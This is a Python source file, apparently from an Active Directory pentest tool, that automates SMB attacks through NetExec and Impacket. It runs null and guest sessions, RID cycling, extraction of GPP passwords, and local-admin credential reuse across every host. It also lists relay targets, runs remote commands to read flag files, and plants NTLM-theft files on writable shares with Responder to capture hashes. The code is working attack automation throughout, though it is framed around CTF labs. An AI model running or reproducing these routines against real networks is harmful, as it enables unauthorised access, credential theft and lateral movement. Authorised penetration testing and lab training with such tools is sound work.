    """Enumerate SMB shares using guest session with --local-auth."""
    target_tokens, _target_source = _resolve_guest_smb_targets(shell, domain=domain)
    if not target_tokens:
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "No guest SMB targets available for local-auth enumeration in domain "
            f"{marked_domain}."
        )
        return
    targets_arg = " ".join(shlex.quote(token) for token in target_tokens)
    log_path = domain_relpath(shell.domains_dir, domain, "smb_guest_shares_local.log")
    guest_auth = _build_guest_auth_nxc(shell, domain=domain)
    command = (
        f"{shell.netexec_path} smb {targets_arg} {guest_auth} "
        f"-t 10 --timeout 60 --smb-timeout 30 "
        f"--shares --local-auth --log {log_path}"
    )
    print_success("Executing guest session")
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="guest",
        password="",
    )


def run_null_general_local(shell: Any, *, domain: str) -> None:
    """Run SMB null session attempt with --local-auth."""
    log_path = domain_relpath(
        shell.domains_dir, domain, "smb", "smb_null_general_local.log"
    )
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --pass-pol --local-auth --log {log_path}'
    )
    print_success("Executing guest session")
    print_info_debug(f"Command: {command}")
    shell.execute_netexec_null(command, domain)


def run_rid_cycling_local(shell: Any, *, domain: str) -> None:
    """Run RID cycling with --local-auth."""
    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_rid_local.log")
    guest_auth = _build_guest_auth_nxc(shell, domain=domain)
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f"{guest_auth} --local-auth --rid-brute 2000 --log {log_path}"
    )
    print_info("Checking RID cycling for local session")
    print_info_debug(f"Command: {command}")
    execute_smb_rid_cycling(shell, command=command, domain=domain)


def execute_netexec_null(shell: Any, *, command: str, domain: str) -> None:
    """Execute NetExec null session command and handle results.

    This function executes a null session NetExec command, checks for successful
    authentication, updates domain state, and triggers follow-up enumeration if needed.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    import shlex

    def _extract_log_path(cmd: str) -> str | None:
        try:
            parts = shlex.split(cmd)
        except ValueError:
            return None
        if "--log" in parts:
            idx = parts.index("--log")
            if idx + 1 < len(parts):
                return parts[idx + 1]
        return None

    def build_null_session_event_properties():
        return {
            "scan_mode": getattr(shell, "scan_mode", None),
            "auth_type": shell.domains_data.get(domain, {}).get("auth", "unknown"),
            "lab_slug": shell._get_lab_slug(),
        }

    def _capture_event_safe(event: str) -> None:
        """Capture telemetry events without breaking null-session flow on failures."""
        try:
            telemetry.capture(event, build_null_session_event_properties())
        except Exception as exc:  # noqa: BLE001
            print_warning_debug(
                "Telemetry event capture skipped during SMB null-session flow: "
                f"event={event} error={type(exc).__name__}: {exc}"
            )

    try:
        _capture_event_safe("null_session_detection_started")
        completed_process = shell._run_netexec(
            command, domain=domain, timeout=300, pre_sync=False
        )
        errors = completed_process.stderr if completed_process else None

        if completed_process and completed_process.returncode == 0:
            output_str = completed_process.stdout
            if "Complexity" in output_str or "accessible" in output_str:
                marked_domain = mark_sensitive(domain, "domain")
                print_warning(
                    f"null session accepted successfully for domain {marked_domain}."
                )
                shell.update_report_field(domain, "smb_null_domain", True)
                try:
                    from adscan_internal.services.report_service import (
                        record_technical_finding,
                    )

                    log_path = _extract_log_path(command)
                    record_technical_finding(
                        shell,
                        domain,
                        key="smb_null_domain",
                        value=True,
                        details={
                            "pdc": shell.domains_data[domain]["pdc"],
                            "auth_type": "null",
                        },
                        evidence=[
                            {
                                "type": "log",
                                "summary": "SMB null session output",
                                "artifact_path": log_path,
                            }
                        ]
                        if log_path
                        else None,
                    )
                except Exception as exc:  # pragma: no cover
                    telemetry.capture_exception(exc)
                if shell.domains_data[domain]["auth"] != "auth":
                    shell.domains_data[domain]["auth"] = "null"

                # Track null session detection in telemetry
                _capture_event_safe("null_session_detected")

                shell.ask_for_smb_enum_users(domain)
            elif "STATUS_NO_LOGON_SERVERS" in output_str or "NETBIOS" in output_str:
                command_added = command + " --local-auth"
                execute_netexec_null(shell, command=command_added, domain=domain)
            else:
                marked_domain = mark_sensitive(domain, "domain")
                print_error(f"null sessions not accepted for domain {marked_domain}.")
                shell.update_report_field(domain, "smb_null_domain", False)
        else:
            print_error("Error executing netexec.")
            if errors:
                print_error(errors)
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("An error occurred while executing the command.")
        print_exception(show_locals=False, exception=e)


def run_null_general(shell: Any, *, domain: str) -> None:
    """Run SMB null session password policy enumeration via NetExec."""
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    print_operation_header(
        "Null Session Attempt",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Type": "Password Policy Enumeration",
            "Authentication": "Anonymous (Null Session)",
        },
        icon="🔓",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_null_general.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --pass-pol --log {log_path}'
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_null(shell, command=command, domain=domain)


def _resolve_smb_auth_for_domain(shell: Any, domain: str) -> tuple[str, str | None]:
    """Resolve SMB auth type + NetExec auth string for a domain."""
    domain_data = shell.domains_data.get(domain, {})
    auth_value = str(domain_data.get("auth") or "unauth").strip().lower()
    if auth_value in {"auth", "pwned"}:
        username = domain_data.get("username")
        password = domain_data.get("password")
        if username and password:
            return auth_value, shell.build_auth_nxc(username, password, domain)
        return auth_value, None
    return auth_value, None


def _ensure_domain_smb_log_path(shell: Any, domain: str, filename: str) -> str:
    """Ensure the SMB log directory exists for a domain and return a relative log path."""
    workspace_cwd = shell._get_workspace_cwd()
    smb_dir_abs = domain_path(workspace_cwd, shell.domains_dir, domain, "smb")
    os.makedirs(smb_dir_abs, exist_ok=True)
    return domain_relpath(shell.domains_dir, domain, "smb", filename)


def run_gpp_autologin(shell: Any, *, target_domain: str) -> None:
    """Enumerate GPP autologin files via NetExec in a target domain."""
    from adscan_internal.rich_output import mark_sensitive

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    log_path = _ensure_domain_smb_log_path(
        shell, target_domain, "gpp_autologin.log"
    )
    command: str | None = None
    auth_type, auth = _resolve_smb_auth_for_domain(shell, target_domain)
    if auth:
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{auth} --smb-timeout 10 --log {log_path} -M gpp_autologin"
        )
    elif auth_type == "guest":
        guest_auth = _build_guest_auth_nxc(shell, domain=target_domain)
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{guest_auth} "
            f"--smb-timeout 10 --log {log_path} -M gpp_autologin"
        )
    elif auth_type == "null":
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u '' -p '' "
            f"--smb-timeout 10 --log {log_path} -M gpp_autologin"
        )

    if command is None:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Unsupported auth type for domain {marked_target_domain}: {auth_type}"
        )
        if auth_type in {"auth", "pwned"}:
            print_error(
                "No stored credentials found for this domain. Please add credentials first."
            )
        return

    marked_target_domain = mark_sensitive(target_domain, "domain")
    marked_auth_type = shell.domains_data[target_domain]["auth"]
    print_info_verbose(
        f"Searching for GPP autologin files in domain {marked_target_domain} using a {marked_auth_type} session"
    )
    shell.execute_netexec_gpp(command, "autologin", target_domain)


def run_gpp_passwords(shell: Any, *, target_domain: str) -> None:
    """Enumerate GPP passwords via NetExec in a target domain."""
    from adscan_internal.rich_output import mark_sensitive

    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    if target_domain not in shell.domains:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
        )
        return

    log_path = _ensure_domain_smb_log_path(shell, target_domain, "gpp_password.log")
    command: str | None = None
    auth_type, auth = _resolve_smb_auth_for_domain(shell, target_domain)
    if auth:
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{auth} --smb-timeout 10 --log {log_path} -M gpp_password"
        )
    elif auth_type == "guest":
        guest_auth = _build_guest_auth_nxc(shell, domain=target_domain)
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"{guest_auth} "
            f"--smb-timeout 10 --log {log_path} -M gpp_password"
        )
    elif auth_type == "null":
        command = (
            f"{shell.netexec_path} smb {shell.domains_data[target_domain]['pdc']} "
            f"-u '' -p '' "
            f"--smb-timeout 10 --log {log_path} -M gpp_password"
        )

    if command is None:
        marked_target_domain = mark_sensitive(target_domain, "domain")
        print_error(
            f"Unsupported auth type for domain {marked_target_domain}: {auth_type}"
        )
        if auth_type in {"auth", "pwned"}:
            print_error(
                "No stored credentials found for this domain. Please add credentials first."
            )
        return

    auth_type_display = {
        "auth": "Authenticated",
        "guest": "Guest Session",
        "null": "Null Session",
    }.get(shell.domains_data[target_domain]["auth"], "Unknown")

    print_operation_header(
        "GPP Password Extraction",
        details={
            "Domain": target_domain,
            "PDC": shell.domains_data[target_domain]["pdc"],
            "Auth Type": auth_type_display,
            "Module": "gpp_password",
            "Output": log_path,
        },
        icon="🔐",
    )

    print_info_debug(f"Command: {command}")
    shell.execute_netexec_gpp(command, "passwords", target_domain)


def run_local_cred_reuse(
    shell: Any,
    *,
    domain: str,
    username: str,
    credential: str,
    prompt_dump_after_reuse: bool = False,
) -> dict[str, Any] | None:
    """Test local admin credential reuse across enabled computers."""
    from adscan_internal import print_operation_header

    cred_type = "Hash" if shell.is_hash(credential) else "Password"
    print_operation_header(
        "Local Administrator Credential Reuse Test",
        details={
            "Domain": domain,
            "Username": username,
            "Credential Type": cred_type,
            "Target": "All Enabled Computers",
            "Authentication": "Local",
            "Threads": "16",
        },
        icon="🔄",
    )

    auth_str = shell.build_auth_nxc(username, credential)
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(f"No host targets are available for domain {marked_domain}.")
        return None
    command = (
        f"{shell.netexec_path} smb {shlex.quote(targets_file)} {auth_str} "
        f"-t 20 --timeout 30 --smb-timeout 10 --local-auth --log "
        f"domains/{domain}/smb/{username}_cred_reuse.txt"
    )
    print_info(
        "Checking for local admin creds reuse (Please be patient, this might take a while on large domains)"
    )
    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {mark_sensitive(domain, 'domain')}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB local-reuse scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )
    try:
        return shell.execute_local_cred_reuse(
            command,
            domain,
            username,
            credential,
            prompt_dump_after_reuse=prompt_dump_after_reuse,
        )
    except TypeError:
        # Backward compatibility for shells that still expose the legacy signature.
        return shell.execute_local_cred_reuse(command, domain, username, credential)


_LOCAL_REUSE_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_LOCAL_REUSE_SMB_LINE_RE = re.compile(
    r"^\s*SMB\s+(?P<target>\S+)\s+\d+\s+(?P<host>[A-Za-z0-9_.-]+)\s+\[(?P<status>[^\]]+)\]\s+(?P<rest>.*)$"
)
_LOCAL_REUSE_FAILURE_CODE_RE = re.compile(
    r"\b(?P<code>(?:STATUS|NT_STATUS|KDC_ERR)_[A-Z0-9_]+)\b"
)


def parse_local_cred_reuse_targets(log_text: str) -> list[dict[str, str]]:
    """Parse NetExec local-auth output and return successful local-admin targets."""
    if not log_text:
        return []

    seen: set[tuple[str, str, str]] = set()
    targets: list[dict[str, str]] = []

    for raw_line in log_text.splitlines():
        line = strip_ansi_codes(raw_line)
        parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line)
        if not parsed and "SMB " in line:
            smb_idx = line.find("SMB ")
            if smb_idx > 0:
                parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line[smb_idx:])
        if not parsed:
            continue
        rest = str(parsed.group("rest") or "")
        # Keep only confirmed local admin sessions.
        if "(pwn3d" not in rest.lower():
            continue

        target = str(parsed.group("target") or "").strip()
        hostname = str(parsed.group("host") or "").strip()
        ip_match = _LOCAL_REUSE_IPV4_RE.search(target)
        ip = ip_match.group(0) if ip_match else ""
        if not ip:
            ip_match = _LOCAL_REUSE_IPV4_RE.search(rest)
            ip = ip_match.group(0) if ip_match else ""

        dedupe_key = (target.lower(), hostname.lower(), ip.lower())
        if dedupe_key in seen:
            continue
        seen.add(dedupe_key)
        targets.append(
            {
                "target": target,
                "hostname": hostname,
                "ip": ip,
            }
        )

    return targets


def parse_local_cred_reuse_outcomes(log_text: str) -> dict[str, int]:
    """Parse NetExec local-auth output and summarize non-Pwn3d outcomes.

    The result helps explain why potential reuse candidates were filtered out
    during active validation (for example `STATUS_ACCOUNT_DISABLED`,
    `STATUS_LOGON_FAILURE`, `KDC_ERR_C_PRINCIPAL_UNKNOWN`).
    """
    if not log_text:
        return {}

    counts: Counter[str] = Counter()
    for raw_line in log_text.splitlines():
        line = strip_ansi_codes(raw_line)
        parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line)
        if not parsed and "SMB " in line:
            smb_idx = line.find("SMB ")
            if smb_idx > 0:
                parsed = _LOCAL_REUSE_SMB_LINE_RE.match(line[smb_idx:])
        if not parsed:
            continue

        rest = str(parsed.group("rest") or "").strip()
        if not rest:
            continue
        if "(pwn3d" in rest.lower():
            counts["PWN3D"] += 1
            continue

        failure = _LOCAL_REUSE_FAILURE_CODE_RE.search(rest)
        if failure:
            counts[str(failure.group("code")).upper()] += 1
            continue
        if "Connection Error" in rest:
            counts["CONNECTION_ERROR"] += 1
            continue
        counts["OTHER_FAILURE"] += 1

    return dict(counts)


def run_smb_relay_targets(shell: Any, *, domain: str) -> None:
    """Enumerate SMB relay targets (hosts with unsigned SMB) using NetExec."""
    from adscan_internal.rich_output import mark_sensitive

    auth = shell.build_auth_nxc(
        shell.domains_data[shell.domain]["username"],
        shell.domains_data[shell.domain]["password"],
        shell.domain,
    )
    marked_domain = mark_sensitive(domain, "domain")
    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    scope_preference = resolve_domain_service_scope_preference(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        prompt_title="Choose the target scope for SMB multi-host checks:",
    )
    targets_file, source = resolve_domain_service_target_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        service="smb",
        domain_data=shell.domains_data.get(domain, {}),
        scope_preference=scope_preference,
    )
    if not targets_file:
        print_error(
            f"No host targets are available for domain {marked_domain}."
        )
        return
    command = (
        f"{shell.netexec_path} smb {shlex.quote(targets_file)} "
        f"{auth} -t 20 --timeout 30 --smb-timeout 10 --log domains/{marked_domain}/smb/relay.log "
        f"--gen-relay-list domains/{marked_domain}/smb/relay_targets.txt"
    )
    targeting_notice = consume_service_targeting_fallback_notice(
        shell,
        workspace_dir=workspace_dir,
        domains_dir=shell.domains_dir,
        domain=domain,
        service="smb",
        source=source,
    )
    if targeting_notice:
        print_info(targeting_notice)
    print_info_debug(
        f"[smb] using domain target file source={source} "
        f"for {marked_domain}: {mark_sensitive(targets_file, 'path')}"
    )
    print_info(
        f"SMB relay scope: {mark_sensitive(source, 'detail')} "
        f"({count_target_file_entries(targets_file)} target(s))"
    )

    username = shell.domains_data.get(shell.domain, {}).get("username", "N/A")
    print_operation_header(
        "SMB Relay Target Enumeration",
        details={
            "Domain": domain,
            "Username": username,
            "Protocol": "SMB",
            "Target": "Hosts with unsigned SMB",
            "Threads": "20",
            "Output": f"domains/{domain}/smb/relay_targets.txt",
        },
        icon="🎯",
    )
    shell.execute_generate_relay_list(command, domain)


def run_get_flags(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Obtain HTB/THM flags via NetExec SMB command execution."""
    if shell.do_sync_clock_with_pdc(domain):
        auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
    else:
        auth = shell.build_auth_nxc(username, password, domain)

    pdc_hostname = shell.domains_data[domain]["pdc_hostname"]
    pdc_fqdn = pdc_hostname + "." + domain
    remote_command = (
        'cmd /c for /f \\"tokens=*\\" %i in (\'dir /s /b C:\\Users\\*user.txt '
        # HTB uses root.txt; TryHackMe uses system.txt. Do not trust lab_provider
        # (it may be absent or wrong), search both.
        'C:\\Users\\*root.txt C:\\Users\\*system.txt\') do type \\"%i\\"'
    )

    from adscan_internal.cli.flags import execute_get_flags
    from adscan_internal.rich_output import mark_sensitive

    marked_domain = mark_sensitive(domain, "domain")
    print_info(f"Obtaining flags from domain {marked_domain}")
    print_info_debug(f"Remote command: {remote_command}")
    execute_get_flags(
        shell,
        domain=domain,
        host=pdc_fqdn,
        auth=auth,
        remote_command=remote_command,
    )


def run_ask_for_smb_gpp(shell: Any, *, domain: str) -> None:
    """Prompt user to search for Group Policy Preferences files.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[domain]["auth"]
        session_type_display = {
            "unauth": "Null Session (Unauthenticated)",
            "auth": "Authenticated Session",
            "pwned": "Administrative Session",
            "with_users": "With Users",
        }.get(auth_type, auth_type.capitalize())

        marked_domain = mark_sensitive(domain, "domain")
        if confirm_operation(
            operation_name="GPP Enumeration",
            description="Searches for Group Policy Preferences files containing credentials",
            context={
                "Domain": marked_domain,
                "PDC": pdc,
                "Session Type": session_type_display,
                "Protocol": "SMB/445",
            },
        ):
            run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_autologin(shell: Any, *, domain: str) -> None:
    """Prompt user to run the NetExec `gpp_autologin` module."""
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_autologin(shell, target_domain=domain)
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    auth_type = shell.domains_data[domain]["auth"]
    session_type_display = {
        "unauth": "Null Session (Unauthenticated)",
        "auth": "Authenticated Session",
        "pwned": "Administrative Session",
        "with_users": "With Users",
    }.get(auth_type, auth_type.capitalize())

    marked_domain = mark_sensitive(domain, "domain")
    if confirm_operation(
        operation_name="GPP Autologin Enumeration",
        description="Searches SYSVOL for autologon credentials stored in policy preferences.",
        context={
            "Domain": marked_domain,
            "PDC": pdc,
            "Session Type": session_type_display,
            "Protocol": "SMB/445",
            "Module": "gpp_autologin",
        },
    ):
        run_gpp_autologin(shell, target_domain=domain)


def run_ask_for_smb_gpp_passwords(shell: Any, *, domain: str) -> None:
    """Prompt user to run the NetExec `gpp_password` module."""
    from adscan_internal.rich_output import confirm_operation, mark_sensitive

    if shell.auto:
        run_gpp_passwords(shell, target_domain=domain)
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    auth_type = shell.domains_data[domain]["auth"]
    session_type_display = {
        "unauth": "Null Session (Unauthenticated)",
        "auth": "Authenticated Session",
        "pwned": "Administrative Session",
        "with_users": "With Users",
    }.get(auth_type, auth_type.capitalize())

    marked_domain = mark_sensitive(domain, "domain")
    if confirm_operation(
        operation_name="GPP Password Enumeration",
        description="Searches SYSVOL for cpassword entries (Group Policy Preferences).",
        context={
            "Domain": marked_domain,
            "PDC": pdc,
            "Session Type": session_type_display,
            "Protocol": "SMB/445",
            "Module": "gpp_password",
        },
    ):
        run_gpp_passwords(shell, target_domain=domain)


def run_gpp_passwords_share(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    share: str,
) -> None:
    """Enumerate GPP passwords on a specific share using Impacket Get-GPPPassword.py."""
    if username == "null":
        auth = shell.build_auth_impacket("", "", domain)
    else:
        auth = shell.build_auth_impacket(username, password, domain)

    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return

    gpp_path = os.path.join(shell.impacket_scripts_dir, "Get-GPPPassword.py")
    if not os.path.isfile(gpp_path) or not os.access(gpp_path, os.X_OK):
        print_error(
            f"Get-GPPPassword.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    marked_share = mark_sensitive(share, "service")
    marked_domain = mark_sensitive(domain, "domain")
    command = f"{gpp_path} {auth} -share {marked_share}"

    print_info(
        f"Searching for Groups XML files in share {marked_share} of domain {marked_domain}"
    )

    try:
        completed_process = shell.run_command(command, timeout=300)
    except Exception as e:  # pylint: disable=broad-except
        telemetry.capture_exception(e)
        print_error("Error executing Get-GPPPassword.py.")
        print_exception(show_locals=False, exception=e)
        return

    output = completed_process.stdout or ""
    lines = output.splitlines()

    # Parse GPP credential entries
    entries: list[dict[str, str]] = []
    for idx, line in enumerate(lines):
        if "found a groups xml file" in line.lower():
            entry: dict[str, str] = {}
            # Parse subsequent lines for key: value
            for subline in lines[idx + 1 :]:
                if ":" not in subline:
                    break
                # Remove any leading log prefix "[*]" and whitespace
                cleaned = re.sub(r"^\[\*\]\s*", "", subline).strip()
                key, val = cleaned.split(":", 1)
                entry[key.strip()] = val.strip()
            if "userName" in entry and "password" in entry:
                entries.append(entry)

    if not entries:
        marked_share = mark_sensitive(share, "service")
        marked_domain = mark_sensitive(domain, "domain")
        print_info(
            f"No Groups XML files found in share {marked_share} of domain {marked_domain}"
        )
    else:
        # Display found credentials in a Rich table
        table = Table(
            title=f"[bold cyan]GPP Credentials found in {share} share[/bold cyan]",
            header_style="bold magenta",
            box=rich.box.SIMPLE,
        )
        table.add_column("Domain", style="cyan")
        table.add_column("User", style="magenta")
        table.add_column("Password", style="green")

        for entry in entries:
            full_user = entry["userName"]
            # Split domain and username from userName
            parts = full_user.rsplit("\\", 1)
            if len(parts) == 2:
                dom, usr = parts
            else:
                dom = domain
                usr = full_user
            pwd = entry.get("password", "")
            marked_dom = mark_sensitive(dom, "domain")
            marked_usr = mark_sensitive(usr, "user")
            marked_pwd = mark_sensitive(pwd, "password")
            table.add_row(marked_dom, marked_usr, marked_pwd)
            # Store credential
            shell.add_credential(dom, usr, pwd)

        print_panel_with_table(table, border_style=BRAND_COLORS["info"])

    if completed_process.returncode != 0:
        error_msg = (
            completed_process.stderr.strip()
            if completed_process.stderr
            else "Details not available"
        )
        print_error(f"Error executing Get-GPPPassword.py: {error_msg}")


def run_smbclient_upload(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Upload generated NTLM capture files to writable SMB shares using smbclient."""
    from adscan_internal.services import ExploitationService

    workspace_cwd = shell._get_workspace_cwd()
    smb_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    smb_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    if not os.path.exists(smb_log_dir):
        print_error(f"Directory {smb_log_dir_rel} not found")
        return

    service = ExploitationService()
    responder_started = False

    # Iterate over each host
    for host in hosts:
        marked_host = mark_sensitive(host, "hostname")
        print_info(f"Processing host: {marked_host}")
        # Iterate over each share for the current host
        for share in shares:
            marked_share = mark_sensitive(share, "service")
            print_info(f"Uploading files to share {marked_share}")

            result = service.smb.upload_files_to_share(
                host=host,
                share=share,
                username=username,
                password=password,
                files_dir=smb_log_dir,
                scan_id=None,
            )

            if result.success:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Files uploaded successfully to {marked_share} on {marked_host}"
                )
                # Keep existing behaviour: start Responder on first successful upload.
                if not responder_started:
                    shell.do_responder("")
                    responder_started = True
            else:
                marked_share = mark_sensitive(share, "service")
                marked_host = mark_sensitive(host, "hostname")
                error_msg = result.error_message or "Details not available"
                print_error(
                    f"Error uploading files to {marked_share} on {marked_host}: {error_msg}"
                )


def run_ntlm_theft(
    shell: Any,
    *,
    domain: str,
    completion_event: threading.Event | None = None,
) -> None:
    """Generate NTLM theft files using the service layer.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name for NTLM theft operation.
        completion_event: Optional threading event to signal when generation completes.
    """
    from adscan_internal.services import ExploitationService

    if not shell.myip:
        print_error("MyIP must be configured before generating files")
        if completion_event:
            completion_event.set()
        return

    # Import TOOLS_INSTALL_DIR from CLI tooling helpers
    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR

    ntlm_theft_path = os.path.join(TOOLS_INSTALL_DIR, "ntlm_theft", "ntlm_theft.py")
    workspace_cwd = shell._get_workspace_cwd()
    output_log_dir = domain_path(
        workspace_cwd, shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )
    output_log_dir_rel = domain_relpath(
        shell.domains_dir, domain, shell.smb_dir, "smb_log"
    )

    print_info("Generating files for NTLM capture")

    service = ExploitationService()
    result = service.smb.generate_ntlm_theft_files(
        ntlm_theft_path=ntlm_theft_path,
        capture_ip=shell.myip,
        output_dir=output_log_dir,
        scan_id=None,
    )

    if result.success:
        print_success(f"Files generated successfully in {output_log_dir_rel}")
    else:
        error_msg = result.error_message or "Details not available"
        print_error(f"Error generating files with ntlm_theft: {error_msg}")

    if completion_event:
        completion_event.set()


def run_ask_for_smb_shares_write(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
) -> None:
    """Prompt user to upload NTLM capture files to writable shares.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names to upload to.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to upload to.
    """
    import threading
    from adscan_internal.rich_output import confirm_operation

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    share_list = (
        ", ".join(shares[:3])
        if isinstance(shares, list) and len(shares) <= 3
        else f"{num_shares} shares"
    )

    if confirm_operation(
        operation_name="Upload NTLM Capture Files",
        description="Uploads malicious files to writable shares to capture NTLM hashes",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Target Shares": share_list,
            "Files": "NTLM theft payloads (SCF, URL, LNK)",
            "Capture IP": shell.myip if shell.myip else "N/A",
        },
        default=True,
        icon="📤",
        show_panel=True,
    ):
        # Create an event to signal when ntlm_theft finishes
        ntlm_completed = threading.Event()

        def process_uploads():
            # Wait for ntlm_theft to finish before continuing
            ntlm_completed.wait()
            run_smbclient_upload(
                shell,
                domain=domain,
                shares=shares,
                username=username,
                password=password,
                hosts=hosts,
            )

        # Start ntlm_theft with the event
        run_ntlm_theft(shell, domain=domain, completion_event=ntlm_completed)
        # Start smbclient in another thread that waits for the signal
        upload_thread = threading.Thread(target=process_uploads, daemon=True)
        upload_thread.start()


def ask_for_smb_shares_read(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    username: str,
    password: str,
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> None:
    """Prompt user to analyze readable SMB shares with deterministic or AI flows.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        shares: List of share names discovered as readable.
        username: Username for authentication.
        password: Password for authentication.
        hosts: List of hostnames/IPs to map/analyze.
        share_map: Optional host->share->permission mapping from share enum.
    """
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )
    from adscan_internal.rich_output import confirm_operation

    if shell.domains_data[domain]["auth"] == "pwned" and shell.type == "ctf":
        return

    original_shares_count = len(shares)
    shares = _filter_shares_by_global_mapping_exclusions(shares)
    share_map = _filter_share_map_by_global_mapping_exclusions(share_map)
    if original_shares_count != len(shares):
        print_info_debug(
            "SMB share list filtered by global mapping exclusions: "
            f"before={original_shares_count} after={len(shares)} "
            "excluded=print$,ipc$,admin$,[A-Z]$"
        )
    if not shares:
        marked_domain = mark_sensitive(domain, "domain")
        print_warning(
            "No readable SMB shares remain after applying global exclusions for "
            f"{marked_domain}."
        )
        return

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
    num_shares = len(shares) if isinstance(shares, list) else "Multiple"
    num_hosts = len(hosts) if isinstance(hosts, list) else "Multiple"
    output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "spider_plus",
        "share_tree_map.json",
    )
    marked_output_rel = mark_sensitive(output_rel, "path")
    cifs_output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )
    marked_cifs_output_rel = mark_sensitive(cifs_output_rel, "path")
    rclone_output_rel = domain_relpath(
